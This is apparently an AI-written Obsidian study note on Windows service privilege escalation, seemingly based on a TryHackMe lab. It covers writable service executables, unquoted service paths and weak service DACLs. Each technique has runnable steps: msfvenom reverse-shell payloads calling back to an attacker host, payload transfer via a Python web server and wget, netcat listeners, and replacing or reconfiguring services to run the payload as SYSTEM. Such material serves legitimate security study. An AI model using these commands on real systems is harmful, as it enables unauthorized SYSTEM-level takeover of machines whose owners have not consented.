Here's a **well-structured Obsidian note** for quick reference and effective recall on **Windows Services Privilege Escalation**. You can paste this into Obsidian as-is using **Markdown syntax**.

---

````markdown
# 🔧 Windows Services (PrivEsc) - Obsidian Note

## 📘 Overview
- **Managed by**: Service Control Manager (SCM)
- **Location of configs**: `HKLM\SYSTEM\CurrentControlSet\Services`
- Each service:
  - Has an executable → `ImagePath`
  - Runs under an account → `ObjectName`
  - Can have a DACL for permissions (who can start/stop/configure)

## 🔎 Inspecting Services

### ➤ Basic Service Info
```bash
sc qc <service_name>
````

* `BINARY_PATH_NAME`: Executable location
* `SERVICE_START_NAME`: Account it runs under

### ➤ Check Executable Permissions

```bash
icacls <path_to_exe>
```

* Look for `Everyone:(M)` or `Users:(M)` — weak perms

---

## 🧨 Exploits

### 1️⃣ Insecure Permissions on Executable

**If service executable is writable**, attacker can:

* Replace it with reverse shell payload
* Restart service to trigger it

#### 🔧 Steps:

1. Check service config:

   ```bash
   sc qc WindowsScheduler
   ```
2. Check perms on executable:

   ```bash
   icacls C:\Path\To\Service.exe
   ```
3. Generate payload:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4445 -f exe-service -o rev-svc.exe
   python3 -m http.server
   ```
4. Transfer + Replace:

   ```powershell
   wget http://<IP>:8000/rev-svc.exe -O rev-svc.exe
   move WService.exe WService.exe.bkp
   move rev-svc.exe WService.exe
   icacls WService.exe /grant Everyone:F
   ```
5. Start listener:

   ```bash
   nc -lvp 4445
   ```
6. Restart service:

   ```cmd
   sc stop <service>
   sc start <service>
   ```

---

### 2️⃣ Unquoted Service Paths

**Unquoted executable paths with spaces** = command ambiguity.

#### 📌 Example:

```text
BINARY_PATH_NAME: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

Windows tries:

* `C:\MyPrograms\Disk.exe`
* `C:\MyPrograms\Disk Sorter.exe`
* `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`

#### ✅ Exploit Conditions:

* Path before actual binary is writable (e.g., `C:\MyPrograms`)
* Attacker can place `Disk.exe` in path

#### 🔧 Steps:

1. Check write access:

   ```bash
   icacls C:\MyPrograms
   ```
2. Generate & place payload:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4446 -f exe-service -o rev-svc2.exe
   move rev-svc2.exe C:\MyPrograms\Disk.exe
   icacls Disk.exe /grant Everyone:F
   ```
3. Start listener:

   ```bash
   nc -lvp 4446
   ```
4. Restart service:

   ```cmd
   sc stop "disk sorter enterprise"
   sc start "disk sorter enterprise"
   ```

---

### 3️⃣ Insecure Service Permissions (DACL)

**If you can reconfigure the service**, you can point it to **your own executable** and **run it as SYSTEM**.

#### 🔧 Steps:

1. Check DACL with AccessChk:

   ```bash
   accesschk64.exe -qlc <service>
   ```

   * Look for: `BUILTIN\Users -> SERVICE_ALL_ACCESS`

2. Generate + upload reverse shell:

   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4447 -f exe-service -o rev-svc3.exe
   icacls rev-svc3.exe /grant Everyone:F
   ```

3. Reconfigure service:

   ```cmd
   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```

4. Start listener:

   ```bash
   nc -lvp 4447
   ```

5. Restart service:

   ```cmd
   sc stop THMService
   sc start THMService
   ```

---

## 🗂️ Registry Service Info

* Path: `HKLM\SYSTEM\CurrentControlSet\Services\<service>`

  * `ImagePath`: Path to executable
  * `ObjectName`: Run-as account
  * `Security`: DACL config (optional)

---

## 🛡️ Tips

* **Use `sc.exe`** in PowerShell (since `sc` is an alias for `Set-Content`)
* **Reverse shell payload format**: `-f exe-service`
* **Escalation Targets**:

  * Services running as SYSTEM
  * Writable service binaries or directories
  * Misconfigured service DACLs

---

## 🔁 Common Tools

* `sc.exe` – manage services
* `icacls` – check/change file permissions
* `accesschk` – check service DACLs
* `msfvenom` – generate payloads
* `nc` / `ncat` – reverse shell listener
* `wget` or PowerShell `Invoke-WebRequest` – file transfer

---

```

